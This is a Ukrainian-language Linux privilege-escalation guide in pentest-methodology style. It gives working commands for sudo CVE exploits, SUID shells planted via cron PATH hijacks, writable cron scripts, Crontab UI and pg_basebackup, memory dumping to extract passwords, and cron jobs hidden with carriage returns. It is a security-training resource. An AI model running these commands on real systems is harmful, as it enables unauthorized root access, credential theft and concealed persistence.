# Підвищення привілеїв у Linux

{{#include ../../../banners/hacktricks-training.md}}

Для ширшого контексту й історичних workflows enumeration порівняйте ресурси g0tmi1k, Payatu, SANS, LPE Workshop, Linux-Privilege-Escalation і linux-private-i, перелічені в розділі references.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[10]](#references)[[11]](#references)[[13]](#references)</sup>

## Інформація про систему

### Інформація про ОС

Почнімо збирати відомості про ОС, яка запущена на цій системі.

```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```

### Шлях

Якщо ви **маєте права на запис у будь-яку папку зі змінної `PATH`**, можливо, ви зможете перехопити деякі бібліотеки або бінарні файли:

```bash
echo $PATH
```

### Інформація про середовище

Цікава інформація, паролі чи API-ключі у змінних середовища?

```bash
(env || set) 2>/dev/null
```

### Kernel exploits

Перевірте версію ядра та з’ясуйте, чи є exploit, який можна використати для підвищення привілеїв.

У розділі [Kernel/LPE/CVE](../../main-system-information/kernel-lpe-cves/README.md) зібрано випадки локального підвищення привілеїв і наведено посилання на докладніші матеріали про ядро Linux у розділі Binary Exploitation. Перш ніж тестувати конкретний випадок, перевірте, чи відповідають йому збірка та конфігурація системи.

```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```

Тут можна знайти хороший список вразливих версій ядра та деякі вже **скомпільовані exploits**: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) і [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).<sup>[[12]](#references)</sup>\
Інші сайти, де можна знайти **скомпільовані exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Щоб витягти всі вразливі версії ядра з цього сайту, можна виконати:

```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```

Інструменти, які можуть допомогти знайти kernel exploits:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (запускайте НА машині жертви; перевіряє наявність експлойтів лише для kernel 2.x)

Завжди **шукайте версію kernel у Google**: можливо, її вказано в описі якогось kernel exploit, і тоді ви знатимете напевно, що цей exploit підходить.

Додаткові техніки експлуатації kernel:

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Підвищення привілеїв у Linux — Linux Kernel <= 3.19.0-73.8

```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```

### Версія Sudo

На основі вразливих версій sudo, які згадуються в:

```bash
searchsploit sudo
```

Ви можете перевірити, чи вразлива версія sudo, за допомогою цього grep.

```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```

### Sudo < 1.9.17p1

Upstream sudo **1.9.14 through 1.9.17** дозволяє локальним користувачам без привілеїв підвищити права до root через опцію `--chroot`, коли sudo завантажує `/etc/nsswitch.conf` із каталогу, контрольованого користувачем; upstream виправив це у версії **1.9.17p1**. Перевірте кожен виконуваний sudo-бінарний файл із root-setuid у відповідних шляхах, оскільки `sudo -V` показує лише бінарний файл, вибраний через `PATH`. Дистрибутивні пакети можуть містити backport виправлення без зміни рядка версії upstream, тому також перевірте статус пакета від постачальника. Дивіться [рекомендацію мейнтейнера sudo](https://www.openwall.com/lists/oss-security/2025/06/30/3).<sup>[[28]](#references)[[29]](#references)</sup>

Ось [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) для експлуатації цієї [уразливості](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Перш ніж запускати експлойт, переконайтеся, що ваша версія `sudo` є вразливою та підтримує функцію `chroot`.

Докладніше дивіться в оригінальному [повідомленні про уразливість](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/).<sup>[[28]](#references)</sup>

### Обхід правил sudo на основі хоста (CVE-2025-32462)

Upstream sudo **1.8.8 through 1.9.17** може перевіряти правила sudoers на основі хоста, використовуючи **ім’я хоста, задане користувачем** через `sudo -h <host>`, замість **реального імені хоста**; upstream виправив це у версії **1.9.17p1**. Користувач усе ще повинен мати відповідний запис sudoers на вибраному хості. Перевірте backport від постачальника й альтернативні бінарні файли sudo, а також локальну політику. Дивіться [рекомендацію мейнтейнера sudo](https://www.openwall.com/lists/oss-security/2025/06/30/2).<sup>[[29]](#references)</sup>

Вимоги:
- Вразлива версія sudo
- Правила sudoers, специфічні для хоста (хост не є ані поточним ім’ям хоста, ані `ALL`)

Приклад шаблону sudoers:

```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```

Exploit через spoofing дозволеного хоста:

```bash
sudo -h devbox id
sudo -h devbox -i
```

Якщо перевірка вибраного імені блокується, з’ясуйте, як це ім’я розпізнається на хості. Сам факт, що ім’я є в журналі або файлі конфігурації, не означає, що його можна розпізнати, а для зміни `/etc/hosts` зазвичай потрібен привілейований доступ на запис.

#### sudo < v1.8.28

Цей [Runas UID bypass з upstream](https://ubuntu.com/security/CVE-2019-14287) вимагає чинного правила sudo, яке дозволяє виконувати команду від імені будь-якого користувача, крім root, наприклад `(ALL, !root) /bin/bash`. Викликач також має право використовувати це правило, зокрема виконувати будь-які вимоги автентифікації. Перевірте рекомендації щодо встановленого пакета: постачальники переносили виправлення в релізи, відображувана upstream-версія яких усе ще нижча за 1.8.28. Саме по собі правило `!root` або стара версія не підтверджує наявність вразливості. Під час пасивного збору даних не перевіряйте це виконанням привілейованої команди.

```
sudo -u#-1 /bin/bash
```

### Помилка перевірки підпису Dmesg

Перегляньте **smasher2 box of HTB** як приклад того, як можна було б експлуатувати цю вразливість.

```bash
dmesg 2>/dev/null | grep "signature"
```

### Додаткове перерахування системи

```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```

## Перелічіть можливі засоби захисту

### AppArmor

```bash
if [ `which aa-status 2>/dev/null` ]; then
    aa-status
  elif [ `which apparmor_status 2>/dev/null` ]; then
    apparmor_status
  elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
    ls -d /etc/apparmor*
  else
    echo "Not found AppArmor"
fi
```

### Grsecurity

```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```

### PaX

```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```

### Execshield

```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```

### SElinux

```bash
 (sestatus 2>/dev/null || echo "Not found sestatus")
```

### ASLR

```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```

## Container Breakout

Якщо ви перебуваєте всередині контейнера, почніть із розділу про безпеку контейнерів, а потім перейдіть до сторінок про зловживання, специфічні для середовища виконання:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Накопичувачі

Перевірте, **що змонтовано й демонтовано**, де і чому. Якщо щось демонтовано, спробуйте змонтувати це й перевірити, чи немає там приватної інформації.

```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```

## Корисне програмне забезпечення

Перелічіть корисні бінарні файли

```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```

Також перевірте, чи встановлено якийсь компілятор. Це корисно, якщо вам потрібно використати kernel exploit, оскільки рекомендується скомпілювати його на машині, де ви збираєтеся його використовувати (або на подібній).

```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```

### Встановлене вразливе програмне забезпечення

Перевірте **версії встановлених пакетів і служб**. Можливо, встановлена стара версія Nagios (наприклад), яку можна використати для підвищення привілеїв…\
Рекомендується вручну перевірити версії підозрілішого встановленого програмного забезпечення.

```bash
dpkg -l #Debian
rpm -qa #Centos
```

Якщо у вас є SSH-доступ до машини, можна також скористатися **openVAS**, щоб перевірити, чи не встановлено на ній застаріле й вразливе програмне забезпечення.

> [!NOTE] > _Зверніть увагу: ці команди виведуть багато інформації, більша частина якої буде марною. Тому рекомендується використовувати такі застосунки, як OpenVAS або подібні, щоб перевірити, чи є встановлене програмне забезпечення вразливим до відомих експлойтів._

## Процеси

Перевірте, **які процеси** виконуються, і з’ясуйте, чи має якийсь процес **більше привілеїв, ніж потрібно** (наприклад, чи не запущено tomcat від імені root).

```bash
ps aux
ps -ef
top -n 1
```

Завжди перевіряйте, чи запущені [**electron/cef/chromium debuggers**](../../software-information/electron-cef-chromium-debugger-abuse.md): ними можна скористатися для підвищення привілеїв. **Linpeas** виявляє їх, перевіряючи наявність параметра `--inspect` у командному рядку процесу.\
Також **перевірте свої привілеї щодо бінарних файлів процесів** — можливо, ви зможете перезаписати якийсь із них.

### Батьківсько-дочірні ланцюжки між користувачами

Дочірній процес, що працює від імені **іншого користувача**, ніж його батьківський процес, не обов’язково є шкідливим, але це корисний **сигнал для подальшої перевірки**. Деякі переходи очікувані (`root` запускає сервісного користувача, менеджери входу створюють процеси сеансів), але незвичні ланцюжки можуть вказувати на обгортки, допоміжні засоби налагодження, механізми закріплення або слабкі межі довіри під час виконання.

Швидка перевірка:

```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```

Якщо виявите несподіваний ланцюжок, перевірте командний рядок батьківського процесу та всі файли, що впливають на його поведінку (`config`, `EnvironmentFile`, допоміжні скрипти, робочий каталог, аргументи, доступні для запису). У кількох реальних шляхах privesc дочірній процес сам не можна було змінити, але можна було змінити **конфігурацію, контрольовану батьківським процесом**, або допоміжний ланцюжок.

### Видалені виконувані файли та відкриті файли, позначені як видалені

Артефакти, створені під час виконання, часто залишаються доступними **навіть після видалення**. Це корисно як для підвищення привілеїв, так і для відновлення доказів із процесу, який уже має відкриті конфіденційні файли.

Перевірте наявність видалених виконуваних файлів:

```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```

Якщо `/proc/<PID>/exe` вказує на `(deleted)`, процес досі виконує старий образ бінарного файлу з пам’яті. Це вагомий сигнал для подальшого розслідування, оскільки:

- видалений виконуваний файл може містити цікаві рядки або облікові дані
- запущений процес усе ще може надавати корисні файлові дескриптори
- видалений привілейований бінарний файл може свідчити про нещодавнє втручання або спробу приховати сліди

Зберіть список відкритих видалених файлів у всій системі:

```bash
lsof +L1
```

Якщо знайдете цікавий дескриптор, відновіть його безпосередньо:

```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```

Це особливо цінно, коли процес досі тримає відкритим видалений секрет, скрипт, експорт бази даних або файл із прапорцем.

### Моніторинг процесів

Для моніторингу процесів можна використовувати такі інструменти, як [**pspy**](https://github.com/DominicBreuker/pspy). Це може бути дуже корисно для виявлення вразливих процесів, які запускаються часто або за виконання певного набору умов.

#### Linux ProcMon через sudo

[ProcMon for Linux](https://github.com/microsoft/ProcMon-for-Linux) може відстежувати вибрані процеси й системні виклики та зберігати трасування у форматі SQLite. Якщо `sudo -l` дозволяє виконувати команду `procmon` із правами root без обмежень, з’ясуйте, чи може вона спостерігати за введенням або виведенням даних іншого користувача. Такий дозвіл — лише привід для перевірки: важливі підтримка трасувальника, чинна політика та активність відповідного процесу. Файли трасування можуть містити секрети, тому уважно перевіряйте дозволені для експорту дані й не збирайте інформацію про сторонні процеси.

### Пам’ять процесів

Деякі служби сервера зберігають **облікові дані у відкритому вигляді в пам’яті**.\
Зазвичай для читання пам’яті процесів, що належать іншим користувачам, потрібні **права root**, тому це зазвичай корисніше, якщо ви вже маєте права root і хочете знайти додаткові облікові дані.\
Однак пам’ятайте, що **звичайний користувач може читати пам’ять власних процесів**.

> [!WARNING]
> Зауважте, що нині більшість машин **типово не дозволяють використовувати ptrace**, а отже, ви не можете знімати дампи інших процесів, що належать вашому непривілейованому користувачеві.
>
> Доступність ptrace контролює файл _**/proc/sys/kernel/yama/ptrace_scope**_:
>
> - **kernel.yama.ptrace_scope = 0**: можна налагоджувати всі процеси з тим самим uid. Так ptrace працював традиційно.
> - **kernel.yama.ptrace_scope = 1**: можна налагоджувати лише батьківський процес.
> - **kernel.yama.ptrace_scope = 2**: використовувати ptrace може лише адміністратор, оскільки для цього потрібна capability CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: за допомогою ptrace не можна трасувати жоден процес. Після встановлення цього значення для повторного ввімкнення ptrace потрібне перезавантаження.

Окремою межею захисту облікових даних може бути процес із тим самим UID, який на короткий час розблоковує сховище паролів. Якщо трасування дозволено, активний процес, доступний для створення дампа, може розкрити пароль до сховища через системні виклики введення або пам’ять, навіть якщо сам зашифрований файл сховища залишається захищеним. `ptrace_scope=0` — лише одна з передумов: також мають значення відповідність облікових даних, можливість створення дампа цільового процесу, інші модулі безпеки Linux і тривалість роботи процесу. Щоб з’ясувати, чи можна використати облікові дані із запису у сховищі для входу до Unix як root, потрібна окрема перевірка повторного використання облікових даних. Під час звичайного переліку слід повідомляти про політику та потенційний процес або шляхи до сховищ, а не перехоплювати введення чи виводити секрети. Див. [документацію Yama у ядрі](https://cdn.kernel.org/doc/html/latest/admin-guide/LSM/Yama.html) і [перевірки доступу ptrace](https://man7.org/linux/man-pages/man2/ptrace.2.html).

#### GDB

Якщо ви маєте доступ до пам’яті служби FTP (наприклад), можна отримати Heap і пошукати в ньому облікові дані.

```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```

#### Скрипт GDB

```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
    | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
    | while read start stop; do \
    gdb --batch --pid $1 -ex \
    "dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```

#### /proc/$pid/maps & /proc/$pid/mem

Для заданого ідентифікатора процесу **maps показує, як пам’ять відображена у віртуальному адресному просторі цього процесу**; також він показує **права доступу для кожної відображеної області**. Псевдофайл **mem** **відкриває доступ до самої пам’яті процесу**. З файла **maps** ми дізнаємося, які **області пам’яті доступні для читання**, та їхні зсуви. Використовуючи цю інформацію, ми можемо **перейти до потрібних позицій у файлі mem і виконати dump усіх доступних для читання областей** у файл.

```bash
procdump()
(
    cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
    while read a b; do
        dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
           skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
    done )
    cat $1*.bin > $1.dump
    rm $1*.bin
)
```

#### /dev/mem

`/dev/mem` надає доступ до **фізичної** пам’яті системи, а не до віртуальної пам’яті. Віртуальний адресний простір ядра доступний через /dev/kmem.\
Зазвичай, `/dev/mem` доступний для читання лише користувачу **root** і групі **kmem**.

```
strings /dev/mem -n10 | grep -i PASS
```

### ProcDump для Linux

ProcDump — це переосмислення класичного інструмента ProcDump із набору інструментів Sysinternals для Windows, адаптоване для Linux. Завантажте його тут: [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)

```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```

### Інструменти

Щоб зняти дамп пам’яті процесу, можна використати:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Ви можете вручну прибрати вимогу root і зняти дамп процесу, яким володієте
- Скрипт A.5 із [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (потрібен root)

### Облікові дані з пам’яті процесу

#### Приклад вручну

Якщо ви виявили, що процес автентифікатора запущений:

```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```

Можна зробити дамп процесу (див. попередні розділи, щоб знайти різні способи дампу пам’яті процесу) і пошукати облікові дані в пам’яті:

```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```

#### mimipenguin

Інструмент [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) **викрадає облікові дані у відкритому вигляді з пам’яті** та з деяких **відомих файлів**. Для належної роботи йому потрібні привілеї root.

| Можливість                                      | Назва процесу        |
| ----------------------------------------------- | -------------------- |
| Пароль GDM (робочий стіл Kali, робочий стіл Debian) | gdm-password         |
| Gnome Keyring (робочий стіл Ubuntu, робочий стіл ArchLinux) | gnome-keyring-daemon |
| LightDM (робочий стіл Ubuntu)                   | lightdm              |
| VSFTPd (активні FTP-з’єднання)                   | vsftpd               |
| Apache2 (активні сеанси HTTP Basic Auth)         | apache2              |
| OpenSSH (активні SSH-сеанси — використання Sudo) | sshd:                |

#### Пошукові регулярні вирази/[truffleproc](https://github.com/controlplaneio/truffleproc)

```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```

## Заплановані завдання/Cron

### Crontab UI (alseambusher), що працює від root — підвищення привілеїв через вебпланувальник

Якщо вебпанель «Crontab UI» (alseambusher/crontab-ui) працює від root і прив’язана лише до loopback, до неї все одно можна отримати доступ через локальне перенаправлення порту SSH і створити привілейоване завдання для підвищення привілеїв.<sup>[[1]](#references)[[4]](#references)</sup>

Типовий ланцюжок
- Виявіть порт, доступний лише через loopback (наприклад, 127.0.0.1:8000), і realm Basic-Auth за допомогою `ss -ntlp` / `curl -v localhost:8000`
- Знайдіть облікові дані в операційних артефактах:
  - Резервні копії/скрипти з `zip -P <password>`
  - Юніт systemd, у якому відкрито задано `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Створіть тунель і увійдіть:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Створити завдання з високими привілеями й негайно запустити (створює SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Використайте це:
```bash
/tmp/rootshell -p   # root shell
```

Захист
- Не запускайте Crontab UI від root; використовуйте окремого користувача з мінімальними дозволами
- Прив’яжіть до localhost і додатково обмежте доступ через firewall/VPN; не використовуйте повторно паролі
- Не вбудовуйте секрети у файли unit; використовуйте сховища секретів або EnvironmentFile, доступний лише root
- Увімкніть аудит і логування запусків завдань за запитом

Перевірте, чи є вразливими заплановані завдання. Можливо, ви зможете скористатися скриптом, який виконується від root (уразливістю wildcard? чи можете змінювати файли, якими користується root? використовувати symlinks? створити в каталозі, яким користується root, певні файли?).

```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

Якщо використовується `run-parts`, перевірте, які імена буде справді виконано:

```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```

Це допомагає уникнути хибнопозитивних результатів. Каталог із періодичним запуском, доступний для запису, корисний лише тоді, коли назва вашого payload відповідає локальним правилам `run-parts`.

### Шлях Cron

Наприклад, у _/etc/crontab_ можна знайти PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Зверніть увагу, що користувач «user» має права на запис у /home/user_)

Якщо в цьому crontab користувач root намагається виконати команду або скрипт, не задавши шлях. Наприклад: _\* \* \* \* root overwrite.sh_\
Тоді можна отримати root shell за допомогою:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```

### Cron із використанням скрипту з підстановочним символом (Wildcard Injection)

Якщо скрипт виконується від імені root і містить «**\***» у команді, це можна використати, щоб спричинити неочікувані наслідки (наприклад, privesc). Приклад:

```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```

**Якщо перед wildcard стоїть шлях, наприклад** _**/some/path/\***_ **, він не є вразливим (навіть** _**./\***_ **не є).**

На цій сторінці наведено інші трюки експлуатації wildcard:


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### Ін'єкція через арифметичне розширення Bash у парсерах журналів cron

Bash може інтерпретувати недовірений текст як арифметичний вираз. У певних контекстах Bash індекс масиву всередині такого виразу може виконати підстановку команди. Якщо привілейований cron-парсер вставляє контрольований атакувальником текст журналу в таке арифметичне порівняння, підстановка може виконатися з правами цього парсера.<sup>[[22]](#references)</sup> Це залежить від конкретного виразу Bash і версії; сам по собі рядок `$(...)0` у розгорнутій змінній не є надійною демонстрацією повторного обчислення.

Джерелом вводу також можуть бути метадані файлу або інше поле, прочитане з місця, доступного для запису користувачам. Наприклад, привілейований скрипт очищення, який зчитує тег `Producer` зображення й порівнює його за допомогою `[[ "$producer" -eq "expected" ]]`, виконує арифметичне порівняння, хоча змінну взято в лапки. Перевірте, від чийого імені запускається задача за розкладом, які файли можуть містити цей тег, які перетворення виконуються перед порівнянням, а також точну поведінку Bash. Для текстових міток використовуйте порівняння рядків; для чисел перед арифметичними операціями перевіряйте, що ввід містить лише десяткові цифри. Див. [правила арифметики Bash](https://www.gnu.org/software/bash/manual/html_node/Shell-Arithmetic.html).

- Типовий вразливий шаблон:
  ```bash
  #!/bin/bash
  # Example: parse a log and "sum" a count field coming from the log
  while IFS=',' read -r ts user count rest; do
      # count is untrusted if the log is attacker-controlled
      (( total += count ))     # or: let "n=$count"
  done < /var/www/app/log/application.log
  ```

- Безпечна локальна перевірка поведінки механізму індексації масивів (без привілейованого процесу чи змінення файлів):
  ```bash
  code='x[$(printf marker >&2)]'
  [[ 200 -eq "$code" ]]
  # Bash may print "marker" while evaluating the arithmetic operand.
  ```

Перевірте фактичний скрипт, запланований до виконання, і буквальний шлях до файлу, який він відкриває. Навіть якщо файл журналу недоступний для запису, користувач, який може записувати дані до його батьківського каталогу без sticky bit і проходити через нього, може замінити запис каталогу; `namei -l` допоможе розрізнити ці права. Інший доступний для запису шлях до журналу, недоступний для читання планувальник або парсер, який не обчислює це поле як Bash arithmetic, не підтверджують цей шлях.

### Перезапис cron-скрипту та symlink

Якщо ви **можете змінити cron-скрипт**, який виконується від імені root, отримати shell дуже легко:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```

Якщо скрипт, який запускається від root, використовує **директорію, до якої ви маєте повний доступ**, можливо, варто видалити цю директорію та **створити symlink на іншу директорію**, де розміщено скрипт під вашим контролем.

```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```

### Перевірка символічних посилань і безпечніша робота з файлами

Перевіряючи привілейовані скрипти/бінарні файли, які читають або записують файли за шляхом, з’ясуйте, як обробляються посилання:

- `stat()` переходить за символічним посиланням і повертає метадані цільового об’єкта.
- `lstat()` повертає метадані самого посилання.
- `readlink -f` і `namei -l` допомагають визначити кінцеву ціль і показують дозволи для кожного компонента шляху.

```bash
readlink -f /path/to/link
namei -l /path/to/link
```

Для захисників/розробників безпечніші способи захисту від symlink-трюків:

- `O_EXCL` разом із `O_CREAT`: завершуватися помилкою, якщо шлях уже існує (блокує попередньо створені зловмисником посилання/файли).
- `openat()`: працювати відносно дескриптора файлу довіреного каталогу.
- `mkstemp()`: атомарно створювати тимчасові файли із захищеними дозволами.

### Бінарні файли cron із власним підписом і доступними для запису payload

Звичайний користувач, який може змінювати саме той бінарний файл, який запускає cron-завдання від root, може перетнути межу привілеїв, але перевірка власного підпису може відхилити непідписану підміну. У задокументованому випадку ELF-файл, що належав root, мав режим `0760`, тож учасник його групи міг змінювати файл, а власник root — виконувати його. Видимий трасувальник процесів показав, що перед запуском бінарного файла завданням `objcopy` витягував `.text_sig`; повний скрипт перевірки був недоступний для читання.<sup>[[2]](#references)</sup>

Успішну підміну підписали за допомогою витоку приватного матеріалу для підпису та ELF-підписувача. У [документації формату](https://github.com/NUAA-WatchDog/linux-elf-binary-signer) описано секцію підпису, похідну від `.text` виконуваного файла. Не показано, що простого додавання сертифіката чи відповідного рядка до `.text_sig` достатньо, щоб пройти невидиму перевірку. Перш ніж робити висновок, що доступний для запису підписаний бінарний файл можна використати для експлуатації, перевірте фактичний шлях запланованого завдання, ефективні права на запис, запуск від root і політику перевірки. Секція `.text_sig` сама по собі є лише приводом для перевірки.

### Часті завдання cron

Можна відстежувати процеси, щоб знаходити ті, які запускаються кожні 1, 2 або 5 хвилин. Можливо, це вдасться використати для підвищення привілеїв.

Наприклад, щоб **відстежувати процеси кожні 0.1 с протягом 1 хвилини**, **відсортувати команди за зростанням кількості запусків** і видалити команди, які запускалися найчастіше, виконайте:

```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```

**Також можна використовувати** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (ця утиліта відстежуватиме й показуватиме кожен запущений процес).

### Резервні копії root, що зберігають установлені атакувальником біти режиму (pg_basebackup)

Якщо cron від root запускає `pg_basebackup` (або будь-яке рекурсивне копіювання) для каталогу бази даних, до якого ви маєте доступ на запис, можна розмістити **SUID/SGID-бінарний файл**, який буде повторно скопійовано як **root:root** із тими самими бітами режиму до каталогу резервної копії.<sup>[[26]](#references)</sup>

Типова послідовність пошуку (від імені користувача БД із низькими привілеями):
- Використайте `pspy`, щоб виявити cron від root, який щохвилини запускає щось на кшталт `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/`.
- Переконайтеся, що ви маєте доступ на запис до вихідного кластера (наприклад, `/var/lib/postgresql/14/main`), а каталог призначення (`/opt/backups/current`) після виконання завдання належить root.

Exploit:

```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```

Це працює, оскільки `pg_basebackup` зберігає біти режиму файлів під час копіювання кластера; коли його запускає root, файли призначення успадковують **власника root + вибрані зловмисником SUID/SGID**. Будь-яка подібна привілейована процедура резервного копіювання/копіювання, яка зберігає дозволи й записує файли в каталог із виконуваними файлами, є вразливою.

### Невидимі завдання cron

Можна створити завдання cron, **додавши повернення каретки після коментаря** (без символу нового рядка), і завдання cron працюватиме. Приклад (зверніть увагу на символ повернення каретки):

```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```

